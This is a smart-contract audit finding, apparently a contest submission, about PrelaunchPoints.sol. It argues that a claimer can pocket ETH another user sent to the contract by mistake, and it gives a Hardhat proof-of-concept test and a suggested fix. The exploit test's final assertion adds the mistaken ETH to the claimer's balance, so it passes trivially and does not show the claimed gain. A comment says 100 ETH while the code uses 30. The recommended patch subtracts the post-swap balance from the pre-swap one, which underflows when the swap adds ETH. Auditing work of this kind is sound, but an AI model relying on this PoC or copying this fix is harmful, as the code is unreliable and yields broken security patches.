## M1 - User can get unexpected earnings at expenses of another user that sent by mistake ETH to the contract

## Impact
PrelaunchPoints.sol line 256 state: `ETH sent to this contract directly will be locked forever.` but that is not true:

After `convertAllETH` phase, when a user `claim` will get unexpected earnings at expenses of another user that sent by mistake ETH to the contract (`receive()`) and also this problem  creates a front running competence to monitor mempool and claim just after the transaction that sends ETH to the contract.

## Proof of Concept

POC showing the unexpected gain if user send 30 ETH (number really big to make clear the example)

Add `NotExpectedGains.test.ts` to $project/test/ and  run `npx hardhat test`

```javascript
import { expect } from "chai"
import hre, { ethers } from "hardhat"
import {
  time,
  impersonateAccount,
  setBalance,
} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import fetch from "node-fetch"
import "dotenv/config"
import {
  IERC20,
  MockLpETH,
  MockLpETHVault,
  PrelaunchPoints,
} from "../typechain"
import { parseEther } from "ethers"

const ZEROX_API_KEY = process.env.ZEROX_API_KEY

const tokens = [
  {
    name: "ezETH",
    address: "0xbf5495Efe5DB9ce00f80364C8B423567e58d2110",
    whale: "0x267ed5f71EE47D3E45Bb1569Aa37889a2d10f91e",
  }
]

describe("Smart Contract Audit", function () {
  const ETH = "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"
  const exchangeProxy = "0xdef1c0ded9bec7f1a1670819833240f027b25eff"

  const sellAmount = ethers.parseEther("1")
  const referral = ethers.encodeBytes32String("")

  // Contracts
  let lockToken: IERC20
  let prelaunchPoints: PrelaunchPoints
  let lpETH: MockLpETH
  let lpETHVault: MockLpETHVault

  before(async () => {
    const LpETH = await hre.ethers.getContractFactory("MockLpETH")
    lpETH = (await LpETH.deploy()) as unknown as MockLpETH

    const LpETHVault = await hre.ethers.getContractFactory("MockLpETHVault")
    lpETHVault = (await LpETHVault.deploy()) as unknown as MockLpETHVault
  })

  beforeEach(async () => {
    const PrelaunchPoints = await hre.ethers.getContractFactory(
      "PrelaunchPoints"
    )
    prelaunchPoints = (await PrelaunchPoints.deploy(
      exchangeProxy,
      "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
      tokens.map((token) => token.address)
    )) as unknown as PrelaunchPoints
  })

  const token = tokens[0];

  it(`User will get unexpected gains at expenses of a user that sent ETH by mistake`, async function () {
    lockToken = (await ethers.getContractAt(
      "IERC20",
      token.address
    )) as unknown as IERC20

    const depositorAddress = token.whale
    await impersonateAccount(depositorAddress)
    const depositor = await ethers.getSigner(depositorAddress)


    const tokenBalanceBefore = await lockToken.balanceOf(depositor)
    console.log(`tokenBalanceBefore ${tokenBalanceBefore}`)

    await lockToken.connect(depositor).approve(prelaunchPoints, sellAmount)
    console.log(`Token address  ${token.address}`)
    await prelaunchPoints
      .connect(depositor)
      .lock(token.address, sellAmount, referral)

    const tokenBalanceAfter = await lockToken.balanceOf(depositor)
    const claimToken = token.name == "WETH" ? ETH : token.address
    const lockedBalance = await prelaunchPoints.balances(
      depositor.address,
      claimToken
    )
    expect(tokenBalanceAfter).to.be.eq(tokenBalanceBefore - sellAmount)
    expect(lockedBalance).to.be.eq(sellAmount)

    // Activate claiming
    await prelaunchPoints.setLoopAddresses(lpETH, lpETHVault)
    const newTime =
      (await prelaunchPoints.loopActivation()) +
      (await prelaunchPoints.TIMELOCK()) +
      1n
    await time.increaseTo(newTime)
    await prelaunchPoints.convertAllETH()

    // Get Quote from 0x API
    const headers = { "0x-api-key": ZEROX_API_KEY }
    const OxUrl =  `https://api.0x.org/swap/v1/quote?buyToken=${ETH}&sellAmount=${sellAmount}&sellToken=${token.address}&includedSources=Uniswap_V3`;
    console.log(`OxUrl   ${OxUrl}`)

    const quoteResponse = await fetch(
      OxUrl,
      { headers }
    )

    // Check for error from 0x API
    if (quoteResponse.status !== 200) {
      const body = await quoteResponse.text()
      throw new Error(body)
    }
    const quote = await quoteResponse.json()

    // console.log(quote)

    const exchange = quote.orders[0] ? quote.orders[0].source : ""
    var exchangeCode = exchange == "Uniswap_V3" ? 0 : 1
    exchangeCode = 1
    //console.log(`DATA: ${quote.data}`);

    //@audit: A User send by error 100 ETH via receive() because s not validated.
    // Number is really big just make clear the example.
    const ethSentByMistake =  parseEther("30");
    await setBalance(prelaunchPoints.target.toString(), ethSentByMistake)

    // Claim
    await prelaunchPoints
      .connect(depositor)
      .claim(claimToken, 
        100
      , exchangeCode, quote.data)

    expect(await prelaunchPoints.balances(depositor, token.address)).to.be.eq(
      0
    )

    const balanceLpETHAfter = await lpETH.balanceOf(depositor)
    console.log("balanceLpETHAfter " + balanceLpETHAfter);
    //@audit: Unpected balance that is much bigger than ((sellAmount * 95n) / 100n)
    expect(balanceLpETHAfter + ethSentByMistake ).to.be.gt(((sellAmount * 95n) / 100n) )
  })
  
})

```

## Tools Used
Manual review and hardhat tests.

## Recommended Mitigation Steps
There are many possibilities:
1) Add validations to receive()
2) Don't rely on address(this).balance directly but instead use a diff before and after the swap.
```javascript
uint256 balanceBeforeSwap = address(this).balance;
_fillQuote(IERC20(_token), userClaim, _data);
claimedAmount = balanceBeforeSwap - address(this).balance;
lpETH.deposit{value: claimedAmount}(_receiver);
```